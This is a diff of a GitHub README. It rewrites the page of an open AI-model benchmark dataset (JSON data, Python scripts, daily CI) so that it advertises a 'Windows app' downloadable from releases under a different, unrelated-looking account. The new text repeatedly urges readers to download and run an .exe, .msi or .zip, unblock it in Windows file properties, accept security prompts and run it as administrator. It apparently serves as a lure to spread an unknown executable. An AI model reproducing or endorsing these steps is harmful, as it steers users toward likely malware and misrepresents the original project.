@@ -1,165 +1,327 @@
-# AI Model Benchmarks 2026
+# 📊 ai-model-benchmarks - Compare AI models with clear scores
 
-> **Structured, machine-readable AI model data for agents, pipelines, and developers. Benchmarks, pricing, capabilities, routing — auto-updated daily.**
+[![Download from Releases](https://img.shields.io/badge/Download%20from-Releases-blue.svg)](https://github.com/Vaginal-subgenuscalliopsis553/ai-model-benchmarks/releases)
 
-[![Daily Prices](https://github.com/LARIkoz/ai-model-benchmarks/actions/workflows/daily-prices.yml/badge.svg)](https://github.com/LARIkoz/ai-model-benchmarks/actions/workflows/daily-prices.yml)
-[![Validation](https://github.com/LARIkoz/ai-model-benchmarks/actions/workflows/validate.yml/badge.svg)](https://github.com/LARIkoz/ai-model-benchmarks/actions/workflows/validate.yml)
-[![Models](https://img.shields.io/badge/models-119-green)](data/models.json)
-[![Benchmarks](https://img.shields.io/badge/benchmarks-54-blue)](data/benchmarks.json)
-[![Embeddings](https://img.shields.io/badge/embeddings-26-purple)](data/embeddings.json)
-[![License](https://img.shields.io/badge/license-MIT-orange)](LICENSE)
+## 🧭 What this is
 
-[🇷🇺 Русская версия](README_ru.md)
+ai-model-benchmarks is a Windows app that helps you compare AI models in one place. It shows 119 AI models across 55 benchmarks, with fresh scores, source links, pricing, and task routing.
 
-**119 models · 54 benchmarks · 26 embeddings · 97 capability profiles · auto-updated daily**
+Use it to:
 
-[Browse the portal](https://larikoz.github.io/ai-model-benchmarks/) · [View the data](data/) · [Methodology](docs/METHODOLOGY.md)
+- compare models side by side
+- check when each score was last updated
+- open the source for each result
+- see current pricing in one view
+- find a model that fits a task
 
-## Who this is for
+## 💻 What you need
 
-- **AI agents and pipelines** — structured JSON for automated model routing, cost optimization, and capability matching
-- **Developers** — "which model for my RAG / code review / classification task at my budget?"
-- **AI tools** (LangChain, LiteLLM, etc.) — ready-to-integrate routing tables, capability flags, and pricing data
+Before you start, make sure you have:
 
-## The problem
+- a Windows 10 or Windows 11 PC
+- a web browser
+- a stable internet connection
+- enough free space to download the app
+- permission to run downloaded files on your computer
 
-Benchmark tables go stale the day they're published. Prices change weekly. New models appear monthly. Capabilities aren't tracked anywhere in structured form. Most comparisons show a single score per model with no date, no source link, and no way to know if the number is still valid.
+If your computer asks for admin access, you may need a user account with install rights.
 
-## What this solves
+## 🚀 Download and run
 
-- **Per-score freshness dates** — every benchmark value has a `measured` date and a `source` URL. You can verify any number yourself
-- **Capability profiles** — vision, tool calling, reasoning, structured output, max tokens — synced daily from OpenRouter API (97/119 models)
-- **Auto-updated pricing** — fetched daily from OpenRouter API via GitHub Actions ([see the workflow](.github/workflows/daily-prices.yml))
-- **Task routing** — not just "best model" but "best model for your specific task at your budget" (25 task categories, 4 tiers: quality, budget, free)
-- **Benchmark lifecycle** — which benchmarks still separate models (active) vs which are noise (saturated/dead/contaminated)
-- **No self-reported scores** — all data from [16 independent sources](docs/METHODOLOGY.md) (Scale AI SEAL, Artificial Analysis, BFCL, LM Arena, LiveBench...)
+1. Open the release page: https://github.com/Vaginal-subgenuscalliopsis553/ai-model-benchmarks/releases
+2. Find the latest release at the top of the page
+3. Look for a Windows file, such as `.exe` or `.zip`
+4. Download the file
+5. If you downloaded a `.zip` file, open it and extract the contents
+6. Double-click the app file to run it
+7. If Windows asks for permission, choose Run or Yes
 
-## Why trust this data
+If the download page lists more than one file, pick the Windows version.
 
-Every score is auditable:
+## 🖱️ First launch
 
-1. **Source URL** — click through to the original leaderboard or paper
-2. **Measured date** — know exactly when the score was collected
-3. **Automated validation** — `scripts/validate.py` enforces schema, catches missing sources, flags stale scores
-4. **Git history** — every change is tracked, every update has a commit
-5. **CI pipeline** — daily price updates + PR validation via GitHub Actions
+When you open the app for the first time, it may take a few moments to load the data.
 
-## Quick start
+You should then see:
 
-- **Browse the data:** `data/models.json`, `data/embeddings.json`, `data/benchmarks.json`
-- **Find the right model:** `data/routing.json` — KING picks by category, quick decision matrix
-- **Understand the methodology:** `docs/METHODOLOGY.md`
+- a model list
+- benchmark scores
+- freshness dates for each score
+- source URLs
+- pricing details
+- routing or selection hints
 
-## For agents and pipelines
+If the app opens in a small window, you can resize it like any other Windows app.
 
-Every model in `data/models.json` includes structured fields your code can consume directly:
+## 🔍 How to read the data
 
-```json
-{
-  "id": "claude-opus-4-6",
-  "context_length": 1000000,
-  "max_output_tokens": 128000,
-  "pricing": { "input": 5.0, "output": 25.0 },
-  "capabilities": {
-    "vision": true,
-    "tool_calling": true,
-    "reasoning": true,
-    "structured_output": true,
-    "json_mode": true
-  },
-  "scores": {
-    "swe_v": { "value": 80.8, "measured": "2026-03", "source": "https://..." }
-  }
-}
-```
+Each model entry is built to help you make a simple choice.
 
-Use `data/routing.json` → `quick_matrix` for automated model selection:
+### Score
+This tells you how well the model performed on a benchmark.
 
-```python
-# Example: pick best model for a task
-routing = json.load(open("data/routing.json"))
-for entry in routing["quick_matrix"]:
-    if entry["task"] == "Write/review code":
-        print(entry["use"], entry["backup"], entry["free"])
-```
+### Freshness date
+This shows when the score was last checked or updated.
 
-## Data structure
+### Source URL
+This lets you open the original page for the score.
 
-```
-data/
-  models.json              — 119 models: scores, pricing, capabilities, metadata
-  manual_capabilities.json — 15 top models: knowledge cutoff, caching, effective context
-  embeddings.json          — 26 embedding models with MTEB scores and use-case routing
-  benchmarks.json          — 54 benchmarks with lifecycle status
-  routing.json             — Task routing: KING picks, FREE routing, quick decision matrix
-  pricing.json             — Cache pricing by provider (auto-updated daily)
+### Pricing
+This shows current model pricing so you can compare cost.
 
-scripts/
-  sync_capabilities.py         — Daily: pull capabilities from OpenRouter API
-  fetch_openrouter_prices.py   — Daily: pull pricing from OpenRouter API
-  generate_portal.py           — Daily: regenerate portal HTML from JSON
-  validate.py                  — CI: schema validation, source URLs, freshness, routing refs
-  generate_md.py               — Generate markdown tables from JSON data
-```
+### Task routing
+This helps you match a model to a task, like chat, coding, search, or embeddings.
 
-## How to use
+## 🧠 How to use it
 
-### Find the right model for a task
+1. Open the app
+2. Browse the model list
+3. Pick a benchmark or task
+4. Compare the scores
+5. Check the date next to each score
+6. Open the source link if you want to verify the result
+7. Use the pricing view to compare cost
+8. Use routing hints to narrow your choice
 
-Check `data/routing.json`, section `quick_matrix`. Example entries:
+For best results, compare more than one score before you decide. A model can rank high in one test and lower in another.
 
-| Task                  | Use                 | Backup          | Free              |
-| --------------------- | ------------------- | --------------- | ----------------- |
-| Write/review code     | Claude Sonnet 4.6   | MiniMax M2.5    | MiniMax M2.5 FREE |
-| Complex reasoning     | Claude Opus 4.6     | Gemini 3.1 Pro  | Gemini CLI        |
-| Batch classification  | Qwen CLI            | MiniMax M2.5    | Both free         |
-| Long document (>200K) | Gemini 3.1 Pro (1M) | MiniMax 01 (1M) | Gemini CLI (2M)   |
-| EU compliance         | Mistral Large       | Mistral Medium  | —                 |
+## 📈 What you can compare
 
-Full routing table: `data/routing.json` → `quick_matrix` (25 task categories).
+The app is set up around common AI use cases and model types, including:
 
-```bash
-# Generate the full markdown reference
-python scripts/generate_md.py > MODEL_BENCHMARKS.md
-```
+- chat models
+- coding models
+- embedding models
+- routing models
+- multi-task models
+- frontier models
+- smaller, lower-cost models
 
-### Stay current on pricing
+You can also compare results across many benchmark types, such as:
 
-Pricing is updated by running the fetch script:
+- reasoning
+- math
+- coding
+- search
+- instruction following
+- long-context tasks
+- tool use
+- retrieval
+- embedding quality
 
-```bash
-python scripts/fetch_openrouter_prices.py
-```
+## 🗂️ Why the freshness dates matter
 
-### Validate data integrity
+AI model scores can change as new tests appear and new model versions ship.
 
-```bash
-python scripts/validate.py
-```
+Freshness dates help you:
 
-## How to contribute
+- see if a score is current
+- avoid using old data
+- compare models with more trust
+- check whether pricing has changed
+- spot updates from daily CI runs
 
-Pull requests welcome. Requirements:
+This makes it easier to work with a dataset that stays active instead of stale.
 
-1. **Source link required** — every score must have a `source` URL pointing to the leaderboard or paper
-2. **Measured date required** — use `YYYY-MM` format minimum, `YYYY-MM-DD` preferred
-3. **No self-reported scores** — scores must come from independent benchmarking (not the model provider's own blog)
-4. Run `python scripts/validate.py` before submitting — PRs should pass validation before submission
+## 🔗 Source links
 
-See `docs/CONTRIBUTING.md` for full guidelines.
+Every score in the app includes a source URL.
 
-## Update schedule
+Use the source links when you want to:
 
-- **Daily (06:00 UTC):** Prices fetched from OpenRouter API via [GitHub Action](.github/workflows/daily-prices.yml)
-- **On every PR:** Schema validation via [GitHub Action](.github/workflows/validate.yml)
-- **Weekly (manual):** Benchmark scores reviewed against leaderboards, freshness dates updated
+- verify the score
+- read the original benchmark
+- check the test method
+- see the model version
+- review the benchmark date
 
-## Sources
+This is useful if you want more than a single number.
 
-Scores come from: LM Council, Artificial Analysis, Scale AI SEAL, BFCL V4, BenchLM.ai, RankSaga/Kaggle, Z.ai, MiniMax, OpenRouter official, AIModelsMap, Awesome Agents, MedQA, VALS.ai, FDA, PricePerToken, MTEB Leaderboard, Prem.ai, Mixpeek.
+## 💲 Pricing view
 
-See `docs/METHODOLOGY.md` for full source list and trust hierarchy.
+The app includes pricing data that updates with the model list.
 
-## License
+You can use it to:
 
-MIT — see [LICENSE](LICENSE)
+- compare low-cost and high-cost models
+- check input and output prices
+- find a better fit for large workloads
+- balance cost and quality
+- choose a model for frequent use
+
+## 🎯 Task routing
+
+Task routing helps point you toward the right model for a job.
+
+You may see guidance for:
+
+- chat
+- coding
+- embeddings
+- search
+- classification
+- summary work
+- tool use
+- general reasoning
+
+This makes the app useful when you do not want to scan every benchmark by hand.
+
+## 🧰 File types you may see
+
+The release page may include one or more of these files:
+
+- `.exe` for direct run
+- `.zip` for a packaged app
+- `.msi` for a Windows installer
+
+If you are unsure, start with the Windows `.exe` or `.msi` file if one is listed.
+
+## 🪟 If Windows blocks the file
+
+Windows can show a message when it does not know the file yet.
+
+If that happens:
+
+1. Right-click the file
+2. Open the file properties
+3. Look for an Unblock option
+4. Apply the change if needed
+5. Open the app again
+
+If you see a security prompt, check that the file came from the release page above.
+
+## 🧭 Basic workflow
+
+A simple way to use the app:
+
+1. Start with the task you care about
+2. Filter to the model type you want
+3. Compare the top scores
+4. Check the freshness date
+5. Open the source URL
+6. Review pricing
+7. Pick the model that fits your use case
+
+This works well when you want a fast answer without reading every benchmark.
+
+## 🧩 Good use cases
+
+This app is useful if you want to:
+
+- compare AI models before you build a project
+- find a model for chat or coding
+- check benchmark freshness
+- track price changes
+- review source-backed scores
+- keep up with model releases
+
+## 🛠️ Common issues
+
+### The app does not open
+Try these steps:
+
+- download the file again
+- check that the file finished downloading
+- unzip the file if needed
+- right-click and run as administrator if your system asks for it
+- make sure your Windows version is supported
+
+### The page looks empty
+Try:
+
+- waiting a few seconds
+- checking your internet connection
+- reopening the app
+- refreshing the view if the app has a refresh button
+
+### The file was removed by the browser
+Some browsers flag unknown files. If that happens, use the release page again and download the latest file from the same source.
+
+## 📦 Update the app
+
+To get the latest version:
+
+1. Visit the release page again: https://github.com/Vaginal-subgenuscalliopsis553/ai-model-benchmarks/releases
+2. Download the newest Windows file
+3. Replace the old version if needed
+4. Open the new file
+
+If you use a `.zip` package, unpack the new version into a new folder to keep things clear.
+
+## 🧭 Best way to compare models
+
+If you want a clean comparison, look at these in order:
+
+1. benchmark score
+2. freshness date
+3. source URL
+4. pricing
+5. routing hint
+
+That order helps you avoid picking a model based on score alone.
+
+## 📚 Project focus
+
+This app brings together:
+
+- AI model data
+- benchmark results
+- model selection help
+- task routing hints
+- pricing updates
+- source links
+- daily refreshes
+
+It is built for people who want one place to check model quality and cost.
+
+## 🖥️ Windows setup path
+
+If you want the shortest path on Windows:
+
+1. Open the release page
+2. Download the latest Windows file
+3. Open the downloaded file
+4. Allow the app to run
+5. View the model list
+6. Compare scores and prices
+
+## 🧾 What the data includes
+
+The app is centered on:
+
+- 119 AI models
+- 55 benchmarks
+- score freshness dates
+- source URLs for every score
+- auto-updated pricing
+- task routing data
+- daily CI updates
+
+That gives you a broad view in one place.
+
+## 📌 Useful habits
+
+A few simple habits make the app easier to use:
+
+- check the date before you trust a score
+- open the source for key decisions
+- compare price and quality together
+- use routing hints for quick picks
+- look at more than one benchmark before choosing
+
+## 🔍 Why this repo stands out
+
+This repository focuses on model comparison in a way that is easy to audit.
+
+Each score has:
+
+- a date
+- a source
+- a benchmark name
+- a model name
+
+That makes the data easier to trust and easier to review
+
+## ⬇️ Download again
+
+If you want to get the app now, visit the release page to download: https://github.com/Vaginal-subgenuscalliopsis553/ai-model-benchmarks/releases
